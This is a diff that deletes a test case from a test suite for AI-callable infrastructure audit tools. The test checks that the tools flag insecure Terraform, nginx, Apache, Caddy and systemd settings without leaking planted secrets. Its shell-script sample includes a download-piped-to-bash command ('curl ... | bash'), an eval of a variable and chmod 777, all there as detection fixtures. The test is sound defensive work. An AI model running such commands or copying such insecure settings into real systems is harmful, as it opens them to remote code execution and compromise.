@@ -420,29 +420,4 @@ describe("Nolane AI callable tools", () => {
     expect(refs).toContain("CACHE_KEY");
   });
 
-
-
-  it("runs Wave 9 text-only infrastructure audits without executing source", async () => {
-    const terraform=await executeAgentTool(env,"process_text_content",{tool_id:"terraform-audit",content:'resource "aws_security_group_rule" "open" {\n cidr_blocks = ["0.0.0.0/0"]\n password = "must-not-leak"\n storage_encrypted = false\n}'});
-    expect(terraform).toContain("public ingress CIDR");
-    expect(terraform).toContain("credential-looking literal assignment");
-    expect(terraform).not.toContain("must-not-leak");
-    const nginx=await executeAgentTool(env,"process_text_content",{tool_id:"nginx-config-audit",content:"server {\n listen 443 ssl;\n server_tokens on;\n autoindex on;\n ssl_protocols TLSv1 TLSv1.2;\n}"});
-    expect(nginx).toContain("server_tokens is enabled");
-    expect(nginx).toContain("weak TLS protocol");
-    const apache=await executeAgentTool(env,"process_text_content",{tool_id:"apache-config-audit",content:"ServerTokens Full\nServerSignature On\nOptions Indexes\nTraceEnable On"});
-    expect(apache).toContain("directory listing Indexes");
-    expect(apache).toContain("TRACE method is enabled");
-    const caddy=await executeAgentTool(env,"process_text_content",{tool_id:"caddy-config-audit",content:":80 {\n auto_https off\n reverse_proxy localhost:8080 {\n  transport http {\n   tls_insecure_skip_verify\n  }\n }\n}"});
-    expect(caddy).toContain("automatic HTTPS is disabled");
-    expect(caddy).toContain("upstream TLS verification is disabled");
-    const systemd=await executeAgentTool(env,"process_text_content",{tool_id:"systemd-unit-audit",content:"[Service]\nUser=root\nExecStart=/bin/sh -c 'echo hi'\nNoNewPrivileges=no\nProtectSystem=no\nPrivateTmp=no"});
-    expect(systemd).toContain("service runs as root");
-    expect(systemd).toContain("shell -c wrapper");
-    const shell=await executeAgentTool(env,"process_text_content",{tool_id:"shell-script-audit",content:"#!/bin/bash\nAPI_TOKEN='secret-no-leak'\neval \"$CMD\"\ncurl https://x.test/a | bash\nchmod 777 /tmp/a"});
-    expect(shell).toContain("eval executes");
-    expect(shell).toContain("download piped directly");
-    expect(shell).not.toContain("secret-no-leak");
-  });
-
 });
